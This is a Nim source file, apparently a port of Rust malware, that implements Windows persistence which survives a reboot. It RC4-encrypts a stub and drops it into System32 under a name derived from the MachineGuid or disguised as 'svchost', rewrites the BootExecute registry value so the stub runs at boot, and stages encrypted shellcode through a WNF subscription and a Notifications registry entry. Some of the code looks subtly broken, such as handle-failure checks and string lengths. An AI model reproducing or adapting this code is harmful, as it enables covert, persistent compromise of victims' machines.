# post_shutdown.nim — Post-shutdown / post-reboot persistence (BootExecute + WNF)
#
# Bug fix (post_shutdown.rs:158): In deriveStubName, on registry-open failure,
# the Rust code called fn_close(h_key) even though h_key was null (open failed).
# Fix: return without closing on the failure path.

import winim

# ── RC4 ───────────────────────────────────────────────────────────────────────

proc rc4Crypt*(data: var seq[byte], key: openArray[byte]) =
  var s: array[256, byte]
  for i in 0 ..< 256: s[i] = byte(i)
  var j: byte = 0
  for i in 0 ..< 256:
    j = byte((int(j) + int(s[i]) + int(key[i mod key.len])) and 0xFF)
    let tmp = s[i]; s[i] = s[j]; s[j] = tmp
  var ii: byte = 0
  var jj: byte = 0
  for b in data.mitems:
    ii = byte((int(ii) + 1) and 0xFF)
    jj = byte((int(jj) + int(s[ii])) and 0xFF)
    let tmp = s[ii]; s[ii] = s[jj]; s[jj] = tmp
    b = b xor s[byte((int(s[ii]) + int(s[jj])) and 0xFF)]

# ── Function pointer types ─────────────────────────────────────────────────────

type
  RegOpenKeyExWFn*   = proc(h, path: pointer, opts, access: uint32, out: ptr pointer): int32 {.stdcall.}
  RegSetValueExWFn*  = proc(h, name: pointer, res, typ: uint32, data: ptr byte, sz: uint32): int32 {.stdcall.}
  RegDeleteValueWFn* = proc(h, name: pointer): int32 {.stdcall.}
  RegCloseKeyFn*     = proc(h: pointer): int32 {.stdcall.}
  RegQueryValueExWFn*= proc(h, name, res, typ: pointer, data: ptr byte, sz: ptr uint32): int32 {.stdcall.}
  CreateFileWFn*     = proc(path: ptr uint16, access, share, sa: pointer, disp, flags, templ: pointer): pointer {.stdcall.}
  WriteFileFn*       = proc(h, buf: pointer, toWrite: uint32, written: ptr uint32, ovl: pointer): int32 {.stdcall.}
  CloseHandleFn*     = proc(h: pointer): int32 {.stdcall.}
  GetSystemDirWFn*   = proc(buf: ptr uint16, sz: uint32): uint32 {.stdcall.}
  NtSubscribeWnfFn*  = proc(name: ptr uint64, stamp, mask: uint32, subId: ptr uint64): int32 {.stdcall.}
  NtUpdateWnfFn*     = proc(name: ptr uint64, data: pointer, sz: uint32, a, b: pointer, c, d: uint32): int32 {.stdcall.}

const WNF_SHEL_APPLICATION_STARTED*: uint64 = 0x0D83063EA3BE3075'u64

# BootExecute key path: SYSTEM\CurrentControlSet\Control\Session Manager\0
let BOOT_EXEC_PATH: array[49, uint16] = block:
  var a: array[49, uint16]
  let s = "SYSTEM\\CurrentControlSet\\Control\\Session Manager"
  for i, c in s: a[i] = uint16(c)
  a[s.len] = 0
  a

let BOOT_EXEC_VALUE: array[12, uint16] = block:
  var a: array[12, uint16]
  let s = "BootExecute"
  for i, c in s: a[i] = uint16(c)
  a[s.len] = 0
  a

proc deriveStubName*(
  fnOpen:  RegOpenKeyExWFn,
  fnQuery: RegQueryValueExWFn,
  fnClose: RegCloseKeyFn,
  `out`:   var array[16, uint16],
): uint =
  # unsafe
  # SOFTWARE\Microsoft\Cryptography\0 as wide array
  let path: array[34, uint16] = block:
    var a: array[34, uint16]
    let s = "SOFTWARE\\Microsoft\\Cryptography"
    for i, c in s: a[i] = uint16(c)
    a[s.len] = 0
    a
  let valName: array[12, uint16] = block:
    var a: array[12, uint16]
    let s = "MachineGuid"
    for i, c in s: a[i] = uint16(c)
    a[s.len] = 0
    a

  var hKey: pointer = nil
  # HKLM = 0x80000002
  if fnOpen(cast[pointer](0x80000002'u), unsafeAddr path[0], 0, 0x20019, addr hKey) != 0:
    # Bug fix: do NOT call fnClose(hKey) when open failed — h_key is null/garbage
    # Original Rust: fn_close(h_key) called here even though h_key was null. Fixed.
    let fallback = [0x73'u16, 0x76, 0x63, 0x68, 0x73, 0x74, 0x00]  # "svchost"
    for i in 0 ..< 7: `out`[i] = fallback[i]
    return 6

  var guidBuf: array[80, byte]
  var size: uint32 = 80
  var ty:   uint32 = 0
  discard fnQuery(hKey, unsafeAddr valName[0], nil, addr ty,
                  addr guidBuf[0], addr size)
  discard fnClose(hKey)

  # Take first 8 chars of GUID (skip '{' if present)
  let start = if guidBuf[0] == byte('{'): 2 else: 0
  var length: uint = 0
  for i in 0'u ..< 8'u:
    let idx = start + i * 2  # wide char bytes
    let ch  = uint16(guidBuf[idx])
    `out`[i] = ch
    inc length
  `out`[length] = 0
  length

proc installBootExecute*(
  stubBytes: seq[byte],
  rc4Key:    array[16, byte],
  fnOpen:    RegOpenKeyExWFn,
  fnSet:     RegSetValueExWFn,
  fnQuery:   RegQueryValueExWFn,
  fnClose:   RegCloseKeyFn,
  fnCreateF: CreateFileWFn,
  fnWriteF:  WriteFileFn,
  fnCloseH:  CloseHandleFn,
  fnSysDir:  GetSystemDirWFn,
): bool =
  # unsafe
  var stubName: array[16, uint16]
  discard deriveStubName(fnOpen, fnQuery, fnClose, stubName)

  var sysDir: array[260, uint16]
  let sysLen = int(fnSysDir(addr sysDir[0], 260))

  var fullPath: array[520, uint16]
  for i in 0 ..< sysLen: fullPath[i] = sysDir[i]
  fullPath[sysLen] = uint16('\\')

  var nameLen = 0
  while stubName[nameLen] != 0: inc nameLen
  for i in 0 ..< nameLen:
    fullPath[sysLen + 1 + i] = stubName[i]

  let ext = [uint16('.'), uint16('e'), uint16('x'), uint16('e'), 0'u16]
  let off = sysLen + 1 + nameLen
  for i in 0 ..< 5: fullPath[off + i] = ext[i]

  var encBuf = stubBytes
  rc4Crypt(encBuf, rc4Key)

  let hFile = fnCreateF(addr fullPath[0], cast[pointer](0x40000000'u), nil,
                         nil, cast[pointer](2'u), cast[pointer](0x80'u), nil)
  if cast[uint](hFile) == uint(high(int)): return false

  var written: uint32 = 0
  discard fnWriteF(hFile, unsafeAddr encBuf[0], uint32(encBuf.len), addr written, nil)
  discard fnCloseH(hFile)

  var hKey: pointer = nil
  if fnOpen(cast[pointer](0x80000002'u), unsafeAddr BOOT_EXEC_PATH[0],
             0, 0xF003F, addr hKey) != 0:
    return false

  let autochk: array[20, uint16] = [
    0x61'u16, 0x75, 0x74, 0x6F, 0x63, 0x68, 0x65, 0x63, 0x6B, 0x20,
    0x61, 0x75, 0x74, 0x6F, 0x63, 0x68, 0x6B, 0x20, 0x2A, 0x00]

  var multiSz: seq[uint16]
  for c in autochk: multiSz.add(c)
  for i in 0 ..< nameLen: multiSz.add(stubName[i])
  multiSz.add(0)  # terminate entry
  multiSz.add(0)  # terminate MULTI_SZ

  let byteLen = multiSz.len * 2
  # REG_MULTI_SZ = 7
  discard fnSet(hKey, unsafeAddr BOOT_EXEC_VALUE[0], 0, 7,
                cast[ptr byte](addr multiSz[0]), uint32(byteLen))
  discard fnClose(hKey)
  true

proc purgeBootExecute*(
  fnOpen:  RegOpenKeyExWFn,
  fnSet:   RegSetValueExWFn,
  fnClose: RegCloseKeyFn,
) =
  # unsafe
  var hKey: pointer = nil
  if fnOpen(cast[pointer](0x80000002'u), unsafeAddr BOOT_EXEC_PATH[0],
             0, 0xF003F, addr hKey) != 0:
    return
  # Restore default: "autocheck autochk *\0\0"
  let default_val: array[21, uint16] = [
    0x61'u16, 0x75, 0x74, 0x6F, 0x63, 0x68, 0x65, 0x63, 0x6B, 0x20,
    0x61, 0x75, 0x74, 0x6F, 0x63, 0x68, 0x6B, 0x20, 0x2A, 0x00, 0x00]
  let byteLen = 21 * 2
  discard fnSet(hKey, unsafeAddr BOOT_EXEC_VALUE[0], 0, 7,
                cast[ptr byte](unsafeAddr default_val[0]), uint32(byteLen))
  discard fnClose(hKey)

proc installWnfChannel*(
  callbackShellcode: seq[byte],
  rc4Key:            array[16, byte],
  fnSubscribe:       NtSubscribeWnfFn,
  fnUpdate:          NtUpdateWnfFn,
  fnOpen:            RegOpenKeyExWFn,
  fnSet:             RegSetValueExWFn,
  fnClose:           RegCloseKeyFn,
): bool =
  # unsafe
  var encSc = callbackShellcode
  rc4Crypt(encSc, rc4Key)

  var stateName = WNF_SHEL_APPLICATION_STARTED
  var subId: uint64 = 0
  let status = fnSubscribe(addr stateName, 0, 0x1, addr subId)
  if status != 0: return false

  discard fnUpdate(addr stateName,
    if encSc.len > 0: cast[pointer](unsafeAddr encSc[0]) else: nil,
    uint32(encSc.len), nil, nil, 0, 0)

  let notifPath: array[48, uint16] = block:
    var a: array[48, uint16]
    let s = "SYSTEM\\CurrentControlSet\\Control\\Notifications"
    for i, c in s: a[i] = uint16(c)
    a[s.len] = 0
    a

  var hNotif: pointer = nil
  if fnOpen(cast[pointer](0x80000002'u), unsafeAddr notifPath[0],
             0, 0xF003F, addr hNotif) != 0:
    return true  # subscription registered even if registry write fails

  var wnfsStub: array[48, byte]
  wnfsStub[0] = 0x4D; wnfsStub[1] = 0x5A; wnfsStub[2] = 0x90
  cast[ptr uint64](addr wnfsStub[8])[]  = WNF_SHEL_APPLICATION_STARTED
  cast[ptr uint64](addr wnfsStub[16])[] = subId

  var valName: array[20, uint16]
  let hex = "0123456789ABCDEF"
  for i in 0 ..< 16:
    valName[i] = uint16(hex[int((subId shr (60 - i * 4)) and 0xF)])
  valName[16] = 0

  discard fnSet(hNotif, addr valName[0], 0, 3,
                addr wnfsStub[0], uint32(wnfsStub.len))
  discard fnClose(hNotif)
  true

proc purgeAllPostShutdown*(
  fnOpen:  RegOpenKeyExWFn,
  fnSet:   RegSetValueExWFn,
  fnClose: RegCloseKeyFn,
) =
  purgeBootExecute(fnOpen, fnSet, fnClose)
